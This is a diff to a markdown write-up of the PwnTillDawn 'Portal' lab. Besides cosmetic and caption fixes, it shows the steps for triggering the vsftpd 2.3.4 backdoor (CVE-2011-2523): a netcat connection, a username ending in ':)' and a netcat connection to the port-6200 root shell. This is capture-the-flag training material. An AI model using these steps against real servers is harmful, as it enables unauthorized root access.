@@ -1,4 +1,4 @@
-# Portal — PwnTillDawn
+# Portal - PwnTillDawn
 
 ## Overview
 
@@ -25,7 +25,7 @@ This version is publicly known to be vulnerable to **CVE-2011-2523**, a maliciou
 
 ---
 
-## Screenshot — Nmap Scan
+## Screenshot - Nmap Scan
 
 <div align="center">
   <img src="assets/nmap_scan.png" alt="Nmap Output Scan" width="700">
@@ -38,14 +38,16 @@ This version is publicly known to be vulnerable to **CVE-2011-2523**, a maliciou
 
 The interesting part of this scan is the FTP, which is using "vsftpd 2.3.4". Check if this version has any vulnerabilities.
 
+---
+
 ## Screenshot - Google Search of The Version Vulnerabilities
 
 <div align="center">
   <img src="assets/research_version.png" alt="Google Search of The Version Vulnerabilities" width="500">
-  <p><em>Nmap Output Scan</em></p>
+  <p><em>Google Search of The Version Vulnerabilities</em></p>
 </div>
 
-
+---
 
 After confirming the vulnerable version, the next step was triggering the backdoor service.
 
@@ -55,11 +57,12 @@ Connect to the FTP service:
 nc 10.150.150.12 21
 ```
 ---
+
 ## Screenshot - Netcat To The Target
 
 <div align="center">
   <img src="assets/netcat.png" alt="Netcat To The Target" width="400">
-  <p><em>Nmap Output Scan</em></p>
+  <p><em>Netcat To The Target</em></p>
 </div>
 
 ---
@@ -71,6 +74,17 @@ Example:
 ```text id="7r9yxs"
 USER anonymous:)
 ```
+
+---
+
+## Screenshot - The Magic Byte
+
+<div align="center">
+  <img src="assets/exploited_credential.png" alt="The Magic Byte" width="400">
+  <p><em>The Magic Byte</em></p>
+</div>
+
+---
 
 Any password can be entered afterward.
 
@@ -84,17 +98,12 @@ nc 10.150.150.12 6200
 
 ---
 
-## Screenshot — Triggering the Backdoor
+## Screenshot - Triggering The Backdoor
 
-```text id="b0ke4w"
-[ Insert FTP exploitation screenshot here ]
-```
-
-Example filename suggestion:
-
-```text id="o9hj1v"
-screenshots/ftp_backdoor_trigger.png
-```
+<div align="center">
+  <img src="assets/exploit.png" alt="The Exploitation" width="400">
+  <p><em>The Exploitation</em></p>
+</div>
 
 ---
 
@@ -113,17 +122,12 @@ The target immediately grants full administrative access.
 
 ---
 
-## Screenshot — Root Shell Access
+## Screenshot - Root Shell Access
 
-```text id="ap3h6d"
-[ Insert root shell screenshot here ]
-```
-
-Example filename suggestion:
-
-```text id="c8ut4n"
-screenshots/root_shell.png
-```
+<div align="center">
+  <img src="assets/rootshell.png" alt="Root Shell Confirmation" width="400">
+  <p><em>Root Shell Confirmation</em></p>
+</div>
 
 ---
 
@@ -140,17 +144,12 @@ Typical post-exploitation steps included:
 
 ---
 
-## Screenshot — Flag Discovery
+## Screenshot - Flag Discovery
 
-```text id="z7d1ko"
-[ Insert flag screenshot here ]
-```
-
-Example filename suggestion:
-
-```text id="f4gq8u"
-screenshots/flag.png
-```
+<div align="center">
+  <img src="assets/lateral_movement.png" alt="Find The Flag" width="400">
+  <p><em>Find The Flag</em></p>
+</div>
 
 ---
 
